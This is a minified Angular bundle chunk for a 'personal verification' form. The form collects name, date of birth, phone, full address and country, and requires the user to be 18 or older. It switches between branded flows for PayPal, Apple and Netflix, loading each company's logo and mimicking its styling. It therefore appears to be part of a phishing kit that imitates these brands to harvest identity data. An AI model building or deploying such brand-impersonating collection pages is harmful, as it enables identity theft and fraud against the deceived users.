import{a as J}from"./chunk-W7OK6WXJ.js";import{a as j}from"./chunk-H32NUYSL.js";import{c as K,d as U,g as H,k as z}from"./chunk-HOQSMOAJ.js";import{a as Q}from"./chunk-6JRQCG67.js";import{d as Y}from"./chunk-QPTOYCUA.js";import{$ as D,A as M,Ea as m,Fa as c,M as I,Ma as h,O as r,Oa as O,T as g,V as S,W as R,X as s,Xa as F,Y as T,Z as V,aa as P,ca as x,da as G,ea as d,fa as l,ga as k,ja as N,ka as u,la as p,nb as Z,ra as _,sa as E,t as L,ta as w,u as v,va as f,wa as C,xa as b,z as y,za as W}from"./chunk-IHDGWWL2.js";var q=[{name:"Afghanistan",code:"AF"},{name:"Albania",code:"AL"},{name:"Algeria",code:"DZ"},{name:"Andorra",code:"AD"},{name:"Angola",code:"AO"},{name:"Antigua and Barbuda",code:"AG"},{name:"Argentina",code:"AR"},{name:"Armenia",code:"AM"},{name:"Australia",code:"AU"},{name:"Austria",code:"AT"},{name:"Azerbaijan",code:"AZ"},{name:"Bahamas",code:"BS"},{name:"Bahrain",code:"BH"},{name:"Bangladesh",code:"BD"},{name:"Barbados",code:"BB"},{name:"Belarus",code:"BY"},{name:"Belgium",code:"BE"},{name:"Belize",code:"BZ"},{name:"Benin",code:"BJ"},{name:"Bhutan",code:"BT"},{name:"Bolivia",code:"BO"},{name:"Bosnia and Herzegovina",code:"BA"},{name:"Botswana",code:"BW"},{name:"Brazil",code:"BR"},{name:"Brunei",code:"BN"},{name:"Bulgaria",code:"BG"},{name:"Burkina Faso",code:"BF"},{name:"Burundi",code:"BI"},{name:"Cabo Verde",code:"CV"},{name:"Cambodia",code:"KH"},{name:"Cameroon",code:"CM"},{name:"Canada",code:"CA"},{name:"Central African Republic",code:"CF"},{name:"Chad",code:"TD"},{name:"Chile",code:"CL"},{name:"China",code:"CN"},{name:"Colombia",code:"CO"},{name:"Comoros",code:"KM"},{name:"Congo (DRC)",code:"CD"},{name:"Congo (Republic)",code:"CG"},{name:"Costa Rica",code:"CR"},{name:"Croatia",code:"HR"},{name:"Cuba",code:"CU"},{name:"Cyprus",code:"CY"},{name:"Czech Republic",code:"CZ"},{name:"Denmark",code:"DK"},{name:"Djibouti",code:"DJ"},{name:"Dominica",code:"DM"},{name:"Dominican Republic",code:"DO"},{name:"Ecuador",code:"EC"},{name:"Egypt",code:"EG"},{name:"El Salvador",code:"SV"},{name:"Equatorial Guinea",code:"GQ"},{name:"Eritrea",code:"ER"},{name:"Estonia",code:"EE"},{name:"Eswatini",code:"SZ"},{name:"Ethiopia",code:"ET"},{name:"Fiji",code:"FJ"},{name:"Finland",code:"FI"},{name:"France",code:"FR"},{name:"Gabon",code:"GA"},{name:"Gambia",code:"GM"},{name:"Georgia",code:"GE"},{name:"Germany",code:"DE"},{name:"Ghana",code:"GH"},{name:"Greece",code:"GR"},{name:"Grenada",code:"GD"},{name:"Guatemala",code:"GT"},{name:"Guinea",code:"GN"},{name:"Guinea-Bissau",code:"GW"},{name:"Guyana",code:"GY"},{name:"Haiti",code:"HT"},{name:"Honduras",code:"HN"},{name:"Hungary",code:"HU"},{name:"Iceland",code:"IS"},{name:"India",code:"IN"},{name:"Indonesia",code:"ID"},{name:"Iran",code:"IR"},{name:"Iraq",code:"IQ"},{name:"Ireland",code:"IE"},{name:"Israel",code:"IL"},{name:"Italy",code:"IT"},{name:"Jamaica",code:"JM"},{name:"Japan",code:"JP"},{name:"Jordan",code:"JO"},{name:"Kazakhstan",code:"KZ"},{name:"Kenya",code:"KE"},{name:"Kiribati",code:"KI"},{name:"North Korea",code:"KP"},{name:"South Korea",code:"KR"},{name:"Kuwait",code:"KW"},{name:"Kyrgyzstan",code:"KG"},{name:"Laos",code:"LA"},{name:"Latvia",code:"LV"},{name:"Lebanon",code:"LB"},{name:"Lesotho",code:"LS"},{name:"Liberia",code:"LR"},{name:"Libya",code:"LY"},{name:"Liechtenstein",code:"LI"},{name:"Lithuania",code:"LT"},{name:"Luxembourg",code:"LU"},{name:"Madagascar",code:"MG"},{name:"Malawi",code:"MW"},{name:"Malaysia",code:"MY"},{name:"Maldives",code:"MV"},{name:"Mali",code:"ML"},{name:"Malta",code:"MT"},{name:"Marshall Islands",code:"MH"},{name:"Mauritania",code:"MR"},{name:"Mauritius",code:"MU"},{name:"Mexico",code:"MX"},{name:"Micronesia",code:"FM"},{name:"Moldova",code:"MD"},{name:"Monaco",code:"MC"},{name:"Mongolia",code:"MN"},{name:"Montenegro",code:"ME"},{name:"Morocco",code:"MA"},{name:"Mozambique",code:"MZ"},{name:"Myanmar",code:"MM"},{name:"Namibia",code:"NA"},{name:"Nauru",code:"NR"},{name:"Nepal",code:"NP"},{name:"Netherlands",code:"NL"},{name:"New Zealand",code:"NZ"},{name:"Nicaragua",code:"NI"},{name:"Niger",code:"NE"},{name:"Nigeria",code:"NG"},{name:"North Macedonia",code:"MK"},{name:"Norway",code:"NO"},{name:"Oman",code:"OM"},{name:"Pakistan",code:"PK"},{name:"Palau",code:"PW"},{name:"Panama",code:"PA"},{name:"Papua New Guinea",code:"PG"},{name:"Paraguay",code:"PY"},{name:"Peru",code:"PE"},{name:"Philippines",code:"PH"},{name:"Poland",code:"PL"},{name:"Portugal",code:"PT"},{name:"Qatar",code:"QA"},{name:"Romania",code:"RO"},{name:"Russia",code:"RU"},{name:"Rwanda",code:"RW"},{name:"Saint Kitts and Nevis",code:"KN"},{name:"Saint Lucia",code:"LC"},{name:"Saint Vincent and the Grenadines",code:"VC"},{name:"Samoa",code:"WS"},{name:"San Marino",code:"SM"},{name:"Sao Tome and Principe",code:"ST"},{name:"Saudi Arabia",code:"SA"},{name:"Senegal",code:"SN"},{name:"Serbia",code:"RS"},{name:"Seychelles",code:"SC"},{name:"Sierra Leone",code:"SL"},{name:"Singapore",code:"SG"},{name:"Slovakia",code:"SK"},{name:"Slovenia",code:"SI"},{name:"Solomon Islands",code:"SB"},{name:"Somalia",code:"SO"},{name:"South Africa",code:"ZA"},{name:"South Sudan",code:"SS"},{name:"Spain",code:"ES"},{name:"Sri Lanka",code:"LK"},{name:"Sudan",code:"SD"},{name:"Suriname",code:"SR"},{name:"Sweden",code:"SE"},{name:"Switzerland",code:"CH"},{name:"Syria",code:"SY"},{name:"Taiwan",code:"TW"},{name:"Tajikistan",code:"TJ"},{name:"Tanzania",code:"TZ"},{name:"Thailand",code:"TH"},{name:"Timor-Leste",code:"TL"},{name:"Togo",code:"TG"},{name:"Tonga",code:"TO"},{name:"Trinidad and Tobago",code:"TT"},{name:"Tunisia",code:"TN"},{name:"Turkey",code:"TR"},{name:"Turkmenistan",code:"TM"},{name:"Tuvalu",code:"TV"},{name:"Uganda",code:"UG"},{name:"Ukraine",code:"UA"},{name:"United Arab Emirates",code:"AE"},{name:"United Kingdom",code:"GB"},{name:"United States",code:"US"},{name:"Uruguay",code:"UY"},{name:"Uzbekistan",code:"UZ"},{name:"Vanuatu",code:"VU"},{name:"Vatican City",code:"VA"},{name:"Venezuela",code:"VE"},{name:"Vietnam",code:"VN"},{name:"Yemen",code:"YE"},{name:"Zambia",code:"ZM"},{name:"Zimbabwe",code:"ZW"}].sort((o,a)=>o.name.localeCompare(a.name)),A=q.map(o=>({original:o,lower:o.name.toLowerCase()}));function X(o){if(!o)return q;let a=o.toLowerCase(),t=[];for(let e=0;e<A.length;e++)A[e].lower.includes(a)&&t.push(A[e].original);return t}var ee=(o,a)=>a.code;function ne(o,a){if(o&1&&k(0,"img",2),o&2){let t=p();s("src",t.logoPath(),I)}}function te(o,a){if(o&1&&(d(0,"div",5)(1,"span",21),_(2,"error"),l(),d(3,"div")(4,"p",22),_(5),m(6,"translate"),l(),d(7,"p",23),_(8),l()()()),o&2){let t=p();r(5),E(c(6,2,"PERSONAL.ERROR_TITLE")),r(3),E(t.state.rejectionReason())}}function ie(o,a){if(o&1){let t=N();d(0,"li",28),u("click",function(){let n=y(t).$implicit,i=p(2);return M(i.selectCountry(n))}),_(1),l()}if(o&2){let t=a.$implicit;r(),w(" ",t.name," ")}}function ae(o,a){if(o&1){let t=N();d(0,"div",11)(1,"div",24)(2,"input",25),b("ngModelChange",function(n){y(t);let i=p();return C(i.searchQuery,n)||(i.searchQuery=n),M(n)}),u("click",function(n){return y(t),M(n.stopPropagation())}),l()(),d(3,"ul",26),x(4,ie,2,1,"li",27,ee),l()()}if(o&2){let t=p();r(2),f("ngModel",t.searchQuery),r(2),G(t.filteredCountries())}}function oe(o,a){if(o&1){let t=N();d(0,"ui-input",29),m(1,"translate"),b("ngModelChange",function(n){y(t);let i=p();return C(i.phoneNumber,n)||(i.phoneNumber=n),M(n)}),u("ngModelChange",function(n){y(t);let i=p();return M(i.onPhoneInput(n))})("blur",function(){y(t);let n=p();return M(n.touchedPhone.set(!0))}),l()}if(o&2){let t=p();s("label",c(1,3,"PERSONAL.PHONE")),f("ngModel",t.phoneNumber),s("error",t.phoneError())}}var $=class o{constructor(){this.state=L(Z);this.currentFlow=this.state.currentFlow;this.currentFlowId=h(()=>this.currentFlow()?.id||"generic");this.firstName="";this.lastName="";this.dob="";this.phoneNumber="";this.country="";this.addrStreet="";this.addrCity="";this.addrZip="";this.searchQuery=g("");this.showDropdown=g(!1);this.touchedName=g(!1);this.touchedDob=g(!1);this.touchedPhone=g(!1);this.touchedAddress=g(!1);this.isValid=g(!1);this.isAdult=g(!0);this.theme=h(()=>this.state.currentFlow()?.theme);this.headerColor=h(()=>this.theme()?.input.textColor||"#111827");this.textColor=h(()=>this.theme()?.input.textColor||"#4b5563");this.showLogo=h(()=>["paypal","apple","netflix"].includes(this.currentFlowId()));this.logoPath=h(()=>`assets/images/logos/${this.currentFlowId()}-logo.svg`);this.isApple=h(()=>this.currentFlowId()==="apple");this.primaryBtnVariant=h(()=>this.currentFlowId()==="netflix"?"danger":"primary");this.filteredCountries=h(()=>X(this.searchQuery()));O(()=>{this.firstName=this.state.firstName(),this.lastName=this.state.lastName(),this.dob=this.state.dob(),this.state.skipPhoneVerification()&&(this.phoneNumber=this.state.phoneNumber()),this.check()},{allowSignalWrites:!0})}containerClasses(){return this.isApple()?"pt-8 max-w-lg mx-auto":""}toggleDropdown(){this.showDropdown.update(a=>!a)}selectCountry(a){this.country=a.name,this.showDropdown.set(!1),this.searchQuery.set(""),this.check(),this.update()}onPhoneInput(a){let t=a.replace(/\D/g,""),e=t.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/),n=t;e&&(e[1]&&(n=`(${e[1]}`),e[2]&&(n+=`) ${e[2]}`),e[3]&&(n+=`-${e[3]}`)),t.length>10&&(n=a),this.phoneNumber=n,this.check(),this.update()}update(){this.state.updatePersonal({first:this.firstName,last:this.lastName,dob:this.dob,address:`${this.addrStreet}, ${this.addrCity} ${this.addrZip}`,country:this.country}),this.state.skipPhoneVerification()&&this.state.updatePhone({number:this.phoneNumber})}check(){let a=!1;if(this.dob){let e=new Date(this.dob),n=new Date,i=n.getFullYear()-e.getFullYear(),B=n.getMonth()-e.getMonth();(B<0||B===0&&n.getDate()<e.getDate())&&i--,a=i>=18}this.isAdult.set(a);let t=!0;this.state.skipPhoneVerification()&&(t=this.phoneNumber.replace(/[^0-9]/g,"").length>=10),this.isValid.set(this.country!==""&&this.firstName.length>=2&&this.lastName.length>=2&&a&&t&&this.addrStreet.length>=5&&this.addrCity.length>=3&&this.addrZip.length>=4)}dobError(){if(this.touchedDob()){if(!this.dob)return"Date of Birth required";if(!this.isAdult())return"Must be 18 or older"}return""}phoneError(){return this.touchedPhone()&&this.phoneNumber.replace(/[^0-9]/g,"").length<10?"Invalid phone number":""}submit(){if(this.isValid()){let a=`${this.addrStreet}, ${this.addrCity} ${this.addrZip}`;this.state.submitPersonal(this.firstName,this.lastName,this.dob,a,this.country)}}static{this.\u0275fac=function(t){return new(t||o)}}static{this.\u0275cmp=v({type:o,selectors:[["app-personal-verification"]],hostVars:1,hostBindings:function(t,e){t&2&&R("data-theme",e.currentFlowId())},standalone:!0,features:[W],decls:39,vars:63,consts:[[1,"personal-container"],[1,"mb-8","text-center","animate-in","slide-in-from-top-4","duration-500"],[1,"h-10","mx-auto","mb-6",3,"src"],[1,"text-2xl","font-bold","mb-3","tracking-tight"],[1,"text-base","text-center","max-w-[90%]","mx-auto","leading-relaxed","opacity-80"],[1,"mb-8","bg-red-50","border-l-[6px]","border-red-500","p-4","flex","items-start","gap-4","rounded-r-lg","animate-fade-in"],[1,"space-y-6","animate-in","slide-in-from-bottom-4","duration-500","delay-100"],[1,"relative","z-50"],[1,"cursor-pointer","relative",3,"click"],[1,"pointer-events-none",3,"label","ngModel","readonly","iconRight"],["slot","icon-right",1,"material-icons","transition-transform","duration-300"],[1,"absolute","w-full","bg-white","border","border-slate-200","rounded-xl","shadow-xl","mt-2","overflow-hidden","animate-in","fade-in","zoom-in-95","z-50","max-h-60","flex","flex-col"],[1,"grid","gap-4"],[3,"ngModelChange","blur","label","ngModel","error"],["type","date",3,"ngModelChange","blur","label","ngModel","error"],["type","tel",3,"label","ngModel","error"],[1,"space-y-4","pt-2"],[1,"grid","grid-cols-2","gap-4"],[3,"ngModelChange","blur","label","ngModel"],[1,"pt-6"],[3,"click","disabled","fullWidth","variant"],[1,"material-icons","text-red-500"],[1,"text-sm","font-bold","text-red-900"],[1,"text-xs","text-red-700","mt-1"],[1,"p-3","border-b","border-slate-100","bg-slate-50","sticky","top-0"],["type","text","placeholder","Search...","autofocus","",1,"w-full","px-4","py-2","bg-white","rounded-lg","border","border-slate-300","text-sm","outline-none","focus:border-blue-500","focus:ring-1","focus:ring-blue-500",3,"ngModelChange","click","ngModel"],[1,"overflow-y-auto","flex-1"],[1,"px-5","py-3","hover:bg-blue-50","text-sm","font-medium","border-b","border-slate-50","last:border-0","cursor-pointer","transition-colors"],[1,"px-5","py-3","hover:bg-blue-50","text-sm","font-medium","border-b","border-slate-50","last:border-0","cursor-pointer","transition-colors",3,"click"],["type","tel",3,"ngModelChange","blur","label","ngModel","error"]],template:function(t,e){t&1&&(d(0,"app-public-layout")(1,"div",0)(2,"header",1),S(3,ne,1,1,"img",2),d(4,"h2",3),_(5),m(6,"translate"),l(),d(7,"p",4),_(8),m(9,"translate"),l()(),S(10,te,9,4,"div",5),d(11,"div",6)(12,"div",7)(13,"div",8),u("click",function(){return e.toggleDropdown()}),d(14,"ui-input",9),m(15,"translate"),d(16,"span",10),_(17,"expand_more"),l()()(),S(18,ae,6,1,"div",11),l(),d(19,"div",12)(20,"ui-input",13),m(21,"translate"),b("ngModelChange",function(i){return C(e.firstName,i)||(e.firstName=i),i}),u("ngModelChange",function(){return e.update()})("blur",function(){return e.touchedName.set(!0)}),l(),d(22,"ui-input",13),m(23,"translate"),b("ngModelChange",function(i){return C(e.lastName,i)||(e.lastName=i),i}),u("ngModelChange",function(){return e.update()})("blur",function(){return e.touchedName.set(!0)}),l()(),d(24,"ui-input",14),m(25,"translate"),b("ngModelChange",function(i){return C(e.dob,i)||(e.dob=i),i}),u("ngModelChange",function(){return e.check(),e.update()})("blur",function(){return e.touchedDob.set(!0)}),l(),S(26,oe,2,5,"ui-input",15),d(27,"div",16)(28,"ui-input",13),m(29,"translate"),b("ngModelChange",function(i){return C(e.addrStreet,i)||(e.addrStreet=i),i}),u("ngModelChange",function(){return e.update()})("blur",function(){return e.touchedAddress.set(!0)}),l(),d(30,"div",17)(31,"ui-input",18),m(32,"translate"),b("ngModelChange",function(i){return C(e.addrCity,i)||(e.addrCity=i),i}),u("ngModelChange",function(){return e.update()})("blur",function(){return e.touchedAddress.set(!0)}),l(),d(33,"ui-input",13),m(34,"translate"),b("ngModelChange",function(i){return C(e.addrZip,i)||(e.addrZip=i),i}),u("ngModelChange",function(){return e.update()})("blur",function(){return e.touchedAddress.set(!0)}),l()()(),d(35,"div",19)(36,"ui-button",20),u("click",function(){return e.submit()}),_(37),m(38,"translate"),l()()()()()),t&2&&(r(),D(e.containerClasses()),r(2),P(e.showLogo()?3:-1),r(),T("color",e.headerColor()),r(),w(" ",c(6,43,"PERSONAL.TITLE")," "),r(2),T("color",e.textColor()),r(),w(" ",c(9,45,"PERSONAL.SUBTITLE")," "),r(2),P(e.state.rejectionReason()?10:-1),r(4),s("label",c(15,47,"PERSONAL.COUNTRY"))("ngModel",e.country)("readonly",!0)("iconRight",!0),r(2),V("rotate-180",e.showDropdown()),r(2),P(e.showDropdown()?18:-1),r(),V("grid-cols-2",!e.isApple())("cols-apple",e.isApple()),r(),s("label",c(21,49,"PERSONAL.FIRST_NAME")),f("ngModel",e.firstName),s("error",e.touchedName()&&e.firstName.length<2?"Required":""),r(2),s("label",c(23,51,"PERSONAL.LAST_NAME")),f("ngModel",e.lastName),s("error",e.touchedName()&&e.lastName.length<2?"Required":""),r(2),s("label",c(25,53,"PERSONAL.DOB")),f("ngModel",e.dob),s("error",e.dobError()),r(2),P(e.state.skipPhoneVerification()?26:-1),r(2),s("label",c(29,55,"PERSONAL.ADDRESS")),f("ngModel",e.addrStreet),s("error",e.touchedAddress()&&e.addrStreet.length<5?"Invalid Address":""),r(3),s("label",c(32,57,"PERSONAL.CITY")),f("ngModel",e.addrCity),r(2),s("label",c(34,59,"PERSONAL.ZIP")),f("ngModel",e.addrZip),s("error",e.touchedAddress()&&e.addrZip.length<4?"Invalid":""),r(3),s("disabled",!e.isValid())("fullWidth",!0)("variant",e.primaryBtnVariant()),r(),w(" ",c(38,61,"COMMON.CONTINUE")," "))},dependencies:[F,z,K,U,H,Q,Y,J,j],styles:["[_nghost-%COMP%]{display:block;width:100%}.cols-apple[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem}"]})}};export{$ as PersonalVerificationComponent};
